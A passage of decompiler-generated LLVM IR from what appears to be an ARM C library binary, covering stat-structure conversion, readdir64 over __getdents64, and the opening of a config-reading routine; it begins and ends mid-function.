  %v0_14c1c = load i32, i32* %r5.global-to-local, align 4
  %v1_14c1c = inttoptr i32 %v0_14c1c to i32*
  store i32 %v2_14c18, i32* %v1_14c1c, align 4
  %v3_14c1c = add i32 %v0_14c1c, 4
  %v4_14c1c = inttoptr i32 %v3_14c1c to i32*
  %v5_14c1c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14c1c, i32* %v4_14c1c, align 4
  %v0_14c20 = load i32, i32* %r6.global-to-local, align 4
  %v1_14c20 = add i32 %v0_14c20, 12
  %v2_14c20 = inttoptr i32 %v1_14c20 to i32*
  %v3_14c20 = load i32, i32* %v2_14c20, align 4
  %v1_14c24 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c24 = add i32 %v1_14c24, 12
  %v3_14c24 = inttoptr i32 %v2_14c24 to i32*
  store i32 %v3_14c20, i32* %v3_14c24, align 4
  %v0_14c28 = load i32, i32* %r6.global-to-local, align 4
  %v1_14c28 = add i32 %v0_14c28, 96
  store i32 %v1_14c28, i32* %r3.global-to-local, align 4
  %v1_14c2c = inttoptr i32 %v1_14c28 to i32*
  %v2_14c2c = load i32, i32* %v1_14c2c, align 4
  store i32 %v2_14c2c, i32* %r3.global-to-local, align 4
  %v3_14c2c = add i32 %v0_14c28, 100
  %v4_14c2c = inttoptr i32 %v3_14c2c to i32*
  %v5_14c2c = load i32, i32* %v4_14c2c, align 4
  store i32 %v5_14c2c, i32* %r4.global-to-local, align 4
  %v1_14c30 = add i32 %v0_14c28, 56
  %v2_14c30 = inttoptr i32 %v1_14c30 to i32*
  %v3_14c30 = load i32, i32* %v2_14c30, align 4
  store i32 %v3_14c30, i32* %r2.global-to-local, align 4
  %v1_14c34 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c34 = add i32 %v1_14c34, 96
  %v3_14c34 = inttoptr i32 %v2_14c34 to i32*
  store i32 %v2_14c2c, i32* %v3_14c34, align 4
  %v0_14c38 = load i32, i32* %r4.global-to-local, align 4
  %v1_14c38 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c38 = add i32 %v1_14c38, 100
  %v3_14c38 = inttoptr i32 %v2_14c38 to i32*
  store i32 %v0_14c38, i32* %v3_14c38, align 4
  %v0_14c3c = load i32, i32* %r6.global-to-local, align 4
  %v1_14c3c = add i32 %v0_14c3c, 24
  store i32 %v1_14c3c, i32* %ip.global-to-local, align 4
  %v1_14c40 = inttoptr i32 %v1_14c3c to i32*
  %v2_14c40 = load i32, i32* %v1_14c40, align 4
  store i32 %v2_14c40, i32* %ip.global-to-local, align 4
  %v3_14c40 = add i32 %v0_14c3c, 28
  %v4_14c40 = inttoptr i32 %v3_14c40 to i32*
  %v5_14c40 = load i32, i32* %v4_14c40, align 4
  store i32 %v5_14c40, i32* %lr.global-to-local, align 4
  %v0_14c44 = load i32, i32* %r2.global-to-local, align 4
  %v1_14c44 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c44 = add i32 %v1_14c44, 56
  %v3_14c44 = inttoptr i32 %v2_14c44 to i32*
  store i32 %v0_14c44, i32* %v3_14c44, align 4
  %v0_14c48 = load i32, i32* %r6.global-to-local, align 4
  %v1_14c48 = add i32 %v0_14c48, 72
  store i32 %v1_14c48, i32* %r3.global-to-local, align 4
  %v1_14c4c = add i32 %v0_14c48, 32
  store i32 %v1_14c4c, i32* %r7.global-to-local, align 4
  %v1_14c50 = inttoptr i32 %v1_14c4c to i32*
  %v2_14c50 = load i32, i32* %v1_14c50, align 4
  store i32 %v2_14c50, i32* %r7.global-to-local, align 4
  %v3_14c50 = add i32 %v0_14c48, 36
  %v4_14c50 = inttoptr i32 %v3_14c50 to i32*
  %v5_14c50 = load i32, i32* %v4_14c50, align 4
  store i32 %v5_14c50, i32* %r8.global-to-local, align 4
  %v1_14c54 = inttoptr i32 %v1_14c48 to i32*
  %v2_14c54 = load i32, i32* %v1_14c54, align 4
  %v3_14c54 = add i32 %v0_14c48, 76
  %v4_14c54 = inttoptr i32 %v3_14c54 to i32*
  %v5_14c54 = load i32, i32* %v4_14c54, align 4
  store i32 %v5_14c54, i32* %r1.global-to-local, align 4
  %v0_14c58 = load i32, i32* %r5.global-to-local, align 4
  %v1_14c58 = add i32 %v0_14c58, 72
  %v1_14c5c = inttoptr i32 %v1_14c58 to i32*
  store i32 %v2_14c54, i32* %v1_14c5c, align 4
  %v3_14c5c = add i32 %v0_14c58, 76
  %v4_14c5c = inttoptr i32 %v3_14c5c to i32*
  %v5_14c5c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14c5c, i32* %v4_14c5c, align 4
  %v0_14c60 = load i32, i32* %r7.global-to-local, align 4
  %v1_14c60 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c60 = add i32 %v1_14c60, 32
  %v3_14c60 = inttoptr i32 %v2_14c60 to i32*
  store i32 %v0_14c60, i32* %v3_14c60, align 4
  %v0_14c64 = load i32, i32* %r8.global-to-local, align 4
  %v1_14c64 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c64 = add i32 %v1_14c64, 36
  %v3_14c64 = inttoptr i32 %v2_14c64 to i32*
  store i32 %v0_14c64, i32* %v3_14c64, align 4
  %v0_14c68 = load i32, i32* %r6.global-to-local, align 4
  %v1_14c68 = add i32 %v0_14c68, 80
  store i32 %v1_14c68, i32* %r3.global-to-local, align 4
  %v1_14c6c = add i32 %v0_14c68, 48
  store i32 %v1_14c6c, i32* %r7.global-to-local, align 4
  %v1_14c70 = inttoptr i32 %v1_14c6c to i32*
  %v2_14c70 = load i32, i32* %v1_14c70, align 4
  store i32 %v2_14c70, i32* %r7.global-to-local, align 4
  %v3_14c70 = add i32 %v0_14c68, 52
  %v4_14c70 = inttoptr i32 %v3_14c70 to i32*
  %v5_14c70 = load i32, i32* %v4_14c70, align 4
  store i32 %v5_14c70, i32* %r8.global-to-local, align 4
  %v1_14c74 = inttoptr i32 %v1_14c68 to i32*
  %v2_14c74 = load i32, i32* %v1_14c74, align 4
  %v3_14c74 = add i32 %v0_14c68, 84
  %v4_14c74 = inttoptr i32 %v3_14c74 to i32*
  %v5_14c74 = load i32, i32* %v4_14c74, align 4
  store i32 %v5_14c74, i32* %r1.global-to-local, align 4
  %v1_14c78 = add i32 %v0_14c68, 16
  %v2_14c78 = inttoptr i32 %v1_14c78 to i32*
  %v3_14c78 = load i32, i32* %v2_14c78, align 4
  store i32 %v3_14c78, i32* %r2.global-to-local, align 4
  %v0_14c7c = load i32, i32* %r5.global-to-local, align 4
  %v1_14c7c = add i32 %v0_14c7c, 80
  %v1_14c80 = inttoptr i32 %v1_14c7c to i32*
  store i32 %v2_14c74, i32* %v1_14c80, align 4
  %v3_14c80 = add i32 %v0_14c7c, 84
  %v4_14c80 = inttoptr i32 %v3_14c80 to i32*
  %v5_14c80 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14c80, i32* %v4_14c80, align 4
  %v0_14c84 = load i32, i32* %r7.global-to-local, align 4
  %v1_14c84 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c84 = add i32 %v1_14c84, 48
  %v3_14c84 = inttoptr i32 %v2_14c84 to i32*
  store i32 %v0_14c84, i32* %v3_14c84, align 4
  %v0_14c88 = load i32, i32* %r8.global-to-local, align 4
  %v1_14c88 = load i32, i32* %r5.global-to-local, align 4
  %v2_14c88 = add i32 %v1_14c88, 52
  %v3_14c88 = inttoptr i32 %v2_14c88 to i32*
  store i32 %v0_14c88, i32* %v3_14c88, align 4
  %v0_14c8c = load i32, i32* %r2.global-to-local, align 4
  %v1_14c8c = load i32, i32* %r5.global-to-local, align 4
  %v2_14c8c = add i32 %v1_14c8c, 16
  %v3_14c8c = inttoptr i32 %v2_14c8c to i32*
  store i32 %v0_14c8c, i32* %v3_14c8c, align 4
  %v0_14c90 = load i32, i32* %r6.global-to-local, align 4
  %v1_14c90 = add i32 %v0_14c90, 88
  store i32 %v1_14c90, i32* %r3.global-to-local, align 4
  %v1_14c94 = add i32 %v0_14c90, 20
  %v2_14c94 = inttoptr i32 %v1_14c94 to i32*
  %v3_14c94 = load i32, i32* %v2_14c94, align 4
  store i32 %v3_14c94, i32* %r2.global-to-local, align 4
  %v1_14c98 = inttoptr i32 %v1_14c90 to i32*
  %v2_14c98 = load i32, i32* %v1_14c98, align 4
  %v3_14c98 = add i32 %v0_14c90, 92
  %v4_14c98 = inttoptr i32 %v3_14c98 to i32*
  %v5_14c98 = load i32, i32* %v4_14c98, align 4
  store i32 %v5_14c98, i32* %r1.global-to-local, align 4
  %v1_14c9c = add i32 %v0_14c90, 64
  store i32 %v1_14c9c, i32* %r6.global-to-local, align 4
  %v1_14ca0 = inttoptr i32 %v1_14c9c to i32*
  %v2_14ca0 = load i32, i32* %v1_14ca0, align 4
  store i32 %v2_14ca0, i32* %r6.global-to-local, align 4
  %v3_14ca0 = add i32 %v0_14c90, 68
  %v4_14ca0 = inttoptr i32 %v3_14ca0 to i32*
  %v5_14ca0 = load i32, i32* %v4_14ca0, align 4
  store i32 %v5_14ca0, i32* %r7.global-to-local, align 4
  %v0_14ca4 = load i32, i32* %r5.global-to-local, align 4
  %v1_14ca4 = add i32 %v0_14ca4, 88
  store i32 %v1_14ca4, i32* %r3.global-to-local, align 4
  %v2_14ca8 = add i32 %v0_14ca4, 20
  %v3_14ca8 = inttoptr i32 %v2_14ca8 to i32*
  store i32 %v3_14c94, i32* %v3_14ca8, align 4
  %v0_14cac = load i32, i32* %ip.global-to-local, align 4
  %v1_14cac = load i32, i32* %r5.global-to-local, align 4
  %v2_14cac = add i32 %v1_14cac, 24
  %v3_14cac = inttoptr i32 %v2_14cac to i32*
  store i32 %v0_14cac, i32* %v3_14cac, align 4
  %v0_14cb0 = load i32, i32* %lr.global-to-local, align 4
  %v1_14cb0 = load i32, i32* %r5.global-to-local, align 4
  %v2_14cb0 = add i32 %v1_14cb0, 28
  %v3_14cb0 = inttoptr i32 %v2_14cb0 to i32*
  store i32 %v0_14cb0, i32* %v3_14cb0, align 4
  %v0_14cb4 = load i32, i32* %r6.global-to-local, align 4
  %v1_14cb4 = load i32, i32* %r5.global-to-local, align 4
  %v2_14cb4 = add i32 %v1_14cb4, 64
  %v3_14cb4 = inttoptr i32 %v2_14cb4 to i32*
  store i32 %v0_14cb4, i32* %v3_14cb4, align 4
  %v0_14cb8 = load i32, i32* %r7.global-to-local, align 4
  %v1_14cb8 = load i32, i32* %r5.global-to-local, align 4
  %v2_14cb8 = add i32 %v1_14cb8, 68
  %v3_14cb8 = inttoptr i32 %v2_14cb8 to i32*
  store i32 %v0_14cb8, i32* %v3_14cb8, align 4
  %v0_14cbc = load i32, i32* %r3.global-to-local, align 4
  %v1_14cbc = inttoptr i32 %v0_14cbc to i32*
  store i32 %v2_14c98, i32* %v1_14cbc, align 4
  %v3_14cbc = add i32 %v0_14cbc, 4
  %v4_14cbc = inttoptr i32 %v3_14cbc to i32*
  %v5_14cbc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14cbc, i32* %v4_14cbc, align 4
  %v2_14cc0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14cc0, i32* %r4.global-to-local, align 4
  ret i32 %v2_14c98

; uselistorder directives
  uselistorder i32 %v0_14c90, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_14c68, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 3, 8, 4, 5, 6, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 8, 0, 1, 2, 3, 4, 5, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @__xstat32_conv(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_14cc8 = load i32, i32* @r4, align 4
  store i32 %v3_14cc8, i32* %stack_var_-16, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* %r5.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* %r2.global-to-local, align 4
  %v3_14ce0 = inttoptr i32 %arg2 to i8*
  %v4_14ce0 = call i32 @__GI_memset(i8* %v3_14ce0, i32 0, i32 88)
  %v2_14ce4 = load i32, i32* %arg1, align 4
  %v3_14ce4 = add i32 %tmp, 4
  %v4_14ce4 = inttoptr i32 %v3_14ce4 to i32*
  %v5_14ce4 = load i32, i32* %v4_14ce4, align 4
  store i32 %v5_14ce4, i32* %r4.global-to-local, align 4
  %v0_14ce8 = load i32, i32* %r6.global-to-local, align 4
  %v1_14ce8 = inttoptr i32 %v0_14ce8 to i32*
  store i32 %v2_14ce4, i32* %v1_14ce8, align 4
  %v3_14ce8 = add i32 %v0_14ce8, 4
  %v4_14ce8 = inttoptr i32 %v3_14ce8 to i32*
  %v5_14ce8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_14ce8, i32* %v4_14ce8, align 4
  %v0_14cec = load i32, i32* %r5.global-to-local, align 4
  %v1_14cec = add i32 %v0_14cec, 32
  %v1_14cf0 = inttoptr i32 %v1_14cec to i32*
  %v2_14cf0 = load i32, i32* %v1_14cf0, align 4
  %v3_14cf0 = add i32 %v0_14cec, 36
  %v4_14cf0 = inttoptr i32 %v3_14cf0 to i32*
  %v5_14cf0 = load i32, i32* %v4_14cf0, align 4
  store i32 %v5_14cf0, i32* %r4.global-to-local, align 4
  %v1_14cf4 = add i32 %v0_14cec, 96
  %v2_14cf4 = inttoptr i32 %v1_14cf4 to i32*
  %v3_14cf4 = load i32, i32* %v2_14cf4, align 4
  store i32 %v3_14cf4, i32* %r2.global-to-local, align 4
  %v1_14cf8 = load i32, i32* %r6.global-to-local, align 4
  %v2_14cf8 = add i32 %v1_14cf8, 32
  %v3_14cf8 = inttoptr i32 %v2_14cf8 to i32*
  store i32 %v2_14cf0, i32* %v3_14cf8, align 4
  %v0_14cfc = load i32, i32* %r4.global-to-local, align 4
  %v1_14cfc = load i32, i32* %r6.global-to-local, align 4
  %v2_14cfc = add i32 %v1_14cfc, 36
  %v3_14cfc = inttoptr i32 %v2_14cfc to i32*
  store i32 %v0_14cfc, i32* %v3_14cfc, align 4
  %v0_14d00 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d00 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d00 = add i32 %v1_14d00, 12
  %v3_14d00 = inttoptr i32 %v2_14d00 to i32*
  store i32 %v0_14d00, i32* %v3_14d00, align 4
  %v0_14d04 = load i32, i32* %r5.global-to-local, align 4
  %v1_14d04 = add i32 %v0_14d04, 48
  %v2_14d04 = inttoptr i32 %v1_14d04 to i32*
  %v3_14d04 = load i32, i32* %v2_14d04, align 4
  %v1_14d08 = add i32 %v0_14d04, 24
  store i32 %v1_14d08, i32* %ip.global-to-local, align 4
  %v1_14d0c = inttoptr i32 %v1_14d08 to i32*
  %v2_14d0c = load i32, i32* %v1_14d0c, align 4
  store i32 %v2_14d0c, i32* %ip.global-to-local, align 4
  %v3_14d0c = add i32 %v0_14d04, 28
  %v4_14d0c = inttoptr i32 %v3_14d0c to i32*
  %v5_14d0c = load i32, i32* %v4_14d0c, align 4
  store i32 %v5_14d0c, i32* %lr.global-to-local, align 4
  %v1_14d10 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d10 = add i32 %v1_14d10, 44
  %v3_14d10 = inttoptr i32 %v2_14d10 to i32*
  store i32 %v3_14d04, i32* %v3_14d10, align 4
  %v0_14d14 = load i32, i32* %r5.global-to-local, align 4
  %v1_14d14 = add i32 %v0_14d14, 64
  %v2_14d14 = inttoptr i32 %v1_14d14 to i32*
  %v3_14d14 = load i32, i32* %v2_14d14, align 4
  %v1_14d18 = add i32 %v0_14d14, 56
  %v2_14d18 = inttoptr i32 %v1_14d18 to i32*
  %v3_14d18 = load i32, i32* %v2_14d18, align 4
  store i32 %v3_14d18, i32* %r2.global-to-local, align 4
  %v1_14d1c = load i32, i32* %r6.global-to-local, align 4
  %v2_14d1c = add i32 %v1_14d1c, 52
  %v3_14d1c = inttoptr i32 %v2_14d1c to i32*
  store i32 %v3_14d14, i32* %v3_14d1c, align 4
  %v0_14d20 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d20 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d20 = add i32 %v1_14d20, 48
  %v3_14d20 = inttoptr i32 %v2_14d20 to i32*
  store i32 %v0_14d20, i32* %v3_14d20, align 4
  %v0_14d24 = load i32, i32* %r5.global-to-local, align 4
  %v1_14d24 = add i32 %v0_14d24, 72
  %v1_14d28 = inttoptr i32 %v1_14d24 to i32*
  %v2_14d28 = load i32, i32* %v1_14d28, align 4
  %v3_14d28 = add i32 %v0_14d24, 76
  %v4_14d28 = inttoptr i32 %v3_14d28 to i32*
  %v5_14d28 = load i32, i32* %v4_14d28, align 4
  store i32 %v5_14d28, i32* %r1.global-to-local, align 4
  %v0_14d2c = load i32, i32* %r6.global-to-local, align 4
  %v1_14d2c = add i32 %v0_14d2c, 56
  %v1_14d30 = inttoptr i32 %v1_14d2c to i32*
  store i32 %v2_14d28, i32* %v1_14d30, align 4
  %v3_14d30 = add i32 %v0_14d2c, 60
  %v4_14d30 = inttoptr i32 %v3_14d30 to i32*
  %v5_14d30 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14d30, i32* %v4_14d30, align 4
  %v0_14d34 = load i32, i32* %r5.global-to-local, align 4
  %v1_14d34 = add i32 %v0_14d34, 80
  %v1_14d38 = inttoptr i32 %v1_14d34 to i32*
  %v2_14d38 = load i32, i32* %v1_14d38, align 4
  %v3_14d38 = add i32 %v0_14d34, 84
  %v4_14d38 = inttoptr i32 %v3_14d38 to i32*
  %v5_14d38 = load i32, i32* %v4_14d38, align 4
  store i32 %v5_14d38, i32* %r1.global-to-local, align 4
  %v0_14d3c = load i32, i32* %r6.global-to-local, align 4
  %v1_14d3c = add i32 %v0_14d3c, 64
  %v1_14d40 = inttoptr i32 %v1_14d3c to i32*
  store i32 %v2_14d38, i32* %v1_14d40, align 4
  %v3_14d40 = add i32 %v0_14d3c, 68
  %v4_14d40 = inttoptr i32 %v3_14d40 to i32*
  %v5_14d40 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14d40, i32* %v4_14d40, align 4
  %v0_14d44 = load i32, i32* %r5.global-to-local, align 4
  %v1_14d44 = add i32 %v0_14d44, 16
  %v2_14d44 = inttoptr i32 %v1_14d44 to i32*
  %v3_14d44 = load i32, i32* %v2_14d44, align 4
  %v1_14d48 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d48 = add i32 %v1_14d48, 16
  %v3_14d48 = inttoptr i32 %v2_14d48 to i32*
  store i32 %v3_14d44, i32* %v3_14d48, align 4
  %v0_14d4c = load i32, i32* %r5.global-to-local, align 4
  %v1_14d4c = add i32 %v0_14d4c, 88
  %v1_14d50 = add i32 %v0_14d4c, 20
  %v2_14d50 = inttoptr i32 %v1_14d50 to i32*
  %v3_14d50 = load i32, i32* %v2_14d50, align 4
  store i32 %v3_14d50, i32* %r2.global-to-local, align 4
  %v1_14d54 = inttoptr i32 %v1_14d4c to i32*
  %v2_14d54 = load i32, i32* %v1_14d54, align 4
  %v3_14d54 = add i32 %v0_14d4c, 92
  %v4_14d54 = inttoptr i32 %v3_14d54 to i32*
  %v5_14d54 = load i32, i32* %v4_14d54, align 4
  store i32 %v5_14d54, i32* %r1.global-to-local, align 4
  %v0_14d58 = load i32, i32* %r6.global-to-local, align 4
  %v1_14d58 = add i32 %v0_14d58, 72
  %v1_14d5c = inttoptr i32 %v1_14d58 to i32*
  store i32 %v2_14d54, i32* %v1_14d5c, align 4
  %v3_14d5c = add i32 %v0_14d58, 76
  %v4_14d5c = inttoptr i32 %v3_14d5c to i32*
  %v5_14d5c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14d5c, i32* %v4_14d5c, align 4
  %v0_14d60 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d60 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d60 = add i32 %v1_14d60, 20
  %v3_14d60 = inttoptr i32 %v2_14d60 to i32*
  store i32 %v0_14d60, i32* %v3_14d60, align 4
  %v0_14d64 = load i32, i32* %ip.global-to-local, align 4
  %v1_14d64 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d64 = add i32 %v1_14d64, 24
  %v3_14d64 = inttoptr i32 %v2_14d64 to i32*
  store i32 %v0_14d64, i32* %v3_14d64, align 4
  %v0_14d68 = load i32, i32* %lr.global-to-local, align 4
  %v1_14d68 = load i32, i32* %r6.global-to-local, align 4
  %v2_14d68 = add i32 %v1_14d68, 28
  %v3_14d68 = inttoptr i32 %v2_14d68 to i32*
  store i32 %v0_14d68, i32* %v3_14d68, align 4
  %v2_14d6c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14d6c, i32* %r4.global-to-local, align 4
  ret i32 %v2_14d54

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32 96, { 5, 3, 4, 1, 2, 0, 6, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
}

define i32 @readdir64(i32* %arg1) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32* @r6, align 4
  %v1_14d88 = add i32 %tmp, 24
  store i32 %v1_14d88, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  %v4_14da0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 112) to i32*), align 4
  store i32 %v4_14da0, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14da0)
  %v0_14db4 = load i32, i32* @r6, align 4
  %v2_14db4 = add i32 %v0_14db4, 16
  %v3_14db4 = inttoptr i32 %v2_14db4 to i32*
  %v4_14db4 = load i32, i32* %v3_14db4, align 4
  store i32 %v4_14db4, i32* %ip.global-to-local, align 4
  store i32 85440, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14db4)
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_14dc4

dec_label_pc_14dc4:                               ; preds = %dec_label_pc_14df4, %entry
  %v0_14dc4 = load i32, i32* @r5, align 4
  %v1_14dc4 = add i32 %v0_14dc4, 4
  %v2_14dc4 = inttoptr i32 %v1_14dc4 to i32*
  %v3_14dc4 = load i32, i32* %v2_14dc4, align 4
  %v4_14dc4 = add i32 %v0_14dc4, 8
  %v5_14dc4 = inttoptr i32 %v4_14dc4 to i32*
  %v6_14dc4 = load i32, i32* %v5_14dc4, align 4
  %tmp10 = icmp ugt i32 %v6_14dc4, %v3_14dc4
  br i1 %tmp10, label %dec_label_pc_14df4, label %dec_label_pc_14dd0

dec_label_pc_14dd0:                               ; preds = %dec_label_pc_14dc4
  %v1_14dd0 = inttoptr i32 %v0_14dc4 to i32*
  %v2_14dd0 = load i32, i32* %v1_14dd0, align 4
  %v1_14dd4 = add i32 %v0_14dc4, 12
  %v2_14dd4 = inttoptr i32 %v1_14dd4 to i32*
  %v3_14dd4 = load i32, i32* %v2_14dd4, align 4
  %v1_14dd8 = add i32 %v0_14dc4, 20
  %v2_14dd8 = inttoptr i32 %v1_14dd8 to i32*
  %v3_14dd8 = load i32, i32* %v2_14dd8, align 4
  %v4_14ddc = inttoptr i32 %v3_14dd4 to i32*
  %v5_14ddc = call i32 @__getdents64(i32 %v2_14dd0, i32* %v4_14ddc, i32 %v3_14dd8, i32 %v6_14dc4)
  %tmp9 = icmp slt i32 %v5_14ddc, 1
  br i1 %tmp9, label %.thread, label %dec_label_pc_14dec

.thread:                                          ; preds = %dec_label_pc_14dd0
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_14e24

dec_label_pc_14dec:                               ; preds = %dec_label_pc_14dd0
  %v1_14dec = load i32, i32* @r5, align 4
  %v2_14dec = add i32 %v1_14dec, 8
  %v3_14dec = inttoptr i32 %v2_14dec to i32*
  store i32 %v5_14ddc, i32* %v3_14dec, align 4
  %v0_14df0 = load i32, i32* @r7, align 4
  %v1_14df0 = load i32, i32* @r5, align 4
  %v2_14df0 = add i32 %v1_14df0, 4
  %v3_14df0 = inttoptr i32 %v2_14df0 to i32*
  store i32 %v0_14df0, i32* %v3_14df0, align 4
  %v0_14df4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14df4

dec_label_pc_14df4:                               ; preds = %dec_label_pc_14dc4, %dec_label_pc_14dec
  %v1_14e18 = phi i32 [ %v0_14dc4, %dec_label_pc_14dc4 ], [ %v0_14df4.pre, %dec_label_pc_14dec ]
  %v1_14df4 = add i32 %v1_14e18, 4
  %v2_14df4 = inttoptr i32 %v1_14df4 to i32*
  %v3_14df4 = load i32, i32* %v2_14df4, align 4
  %v1_14df8 = add i32 %v1_14e18, 12
  %v2_14df8 = inttoptr i32 %v1_14df8 to i32*
  %v3_14df8 = load i32, i32* %v2_14df8, align 4
  %v2_14dfc = add i32 %v3_14df8, %v3_14df4
  store i32 %v2_14dfc, i32* @r4, align 4
  %v3_14e00 = inttoptr i32 %v2_14dfc to i32*
  %v4_14e00 = load i32, i32* %v3_14e00, align 4
  %v1_14e04 = add i32 %v2_14dfc, 4
  %v2_14e04 = inttoptr i32 %v1_14e04 to i32*
  %v3_14e04 = load i32, i32* %v2_14e04, align 4
  %v1_14e08 = add i32 %v2_14dfc, 16
  %v2_14e08 = inttoptr i32 %v1_14e08 to i16*
  %v3_14e08 = load i16, i16* %v2_14e08, align 2
  %v4_14e08 = zext i16 %v3_14e08 to i32
  %v1_14e0c = add i32 %v2_14dfc, 8
  %v2_14e0c = inttoptr i32 %v1_14e0c to i32*
  %v3_14e0c = load i32, i32* %v2_14e0c, align 4
  store i32 %v3_14e0c, i32* %ip.global-to-local, align 4
  %v2_14e10 = add i32 %v4_14e08, %v3_14df4
  %v2_14e14 = or i32 %v3_14e04, %v4_14e00
  %v4_14e14 = icmp eq i32 %v2_14e14, 0
  store i32 %v2_14e10, i32* %v2_14df4, align 4
  %v0_14e1c = load i32, i32* %ip.global-to-local, align 4
  %v1_14e1c = load i32, i32* @r5, align 4
  %v2_14e1c = add i32 %v1_14e1c, 16
  %v3_14e1c = inttoptr i32 %v2_14e1c to i32*
  store i32 %v0_14e1c, i32* %v3_14e1c, align 4
  br i1 %v4_14e14, label %dec_label_pc_14dc4, label %dec_label_pc_14e24

dec_label_pc_14e24:                               ; preds = %dec_label_pc_14df4, %.thread
  %v0_14e30 = load i32, i32* @r6, align 4
  %v2_14e30 = add i32 %v0_14e30, 44
  %v3_14e30 = inttoptr i32 %v2_14e30 to i32*
  %v4_14e30 = load i32, i32* %v3_14e30, align 4
  store i32 %v4_14e30, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14e30)
  %v0_14e3c = load i32, i32* @r4, align 4
  ret i32 %v0_14e3c

; uselistorder directives
  uselistorder i32 %v2_14dfc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_14e18, { 1, 0 }
  uselistorder i32 %v6_14dc4, { 1, 0 }
  uselistorder i32 %v0_14dc4, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 0, 4 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_214b8.340 to i32), i32 112) to i32*), { 0, 1, 2, 3, 4, 7, 5, 6 }
  uselistorder label %dec_label_pc_14df4, { 1, 0 }
}

define i32 @function_14e50(i32 %arg1) local_unnamed_addr {
dec_label_pc_14e50:
  %v0_14e50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14e50, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14e50
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14e50, %bb
  %v4_14e5c = phi i32 [ %arg1, %dec_label_pc_14e50 ], [ 0, %bb ]
  ret i32 %v4_14e5c

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @__GI_config_read(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_14e60 = load i32, i32* @r4, align 4
  %v6_14e60 = load i32, i32* @r5, align 4
  %v9_14e60 = load i32, i32* @r6, align 4
  %v12_14e60 = load i32, i32* @r7, align 4
  %v15_14e60 = load i32, i32* @r8, align 4
  %v18_14e60 = load i32, i32* @sb, align 4
  %v21_14e60 = load i32, i32* @sl, align 4
  %v24_14e60 = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_14e64 = icmp eq i32* %arg1, null
  store i1 %v2_14e64, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
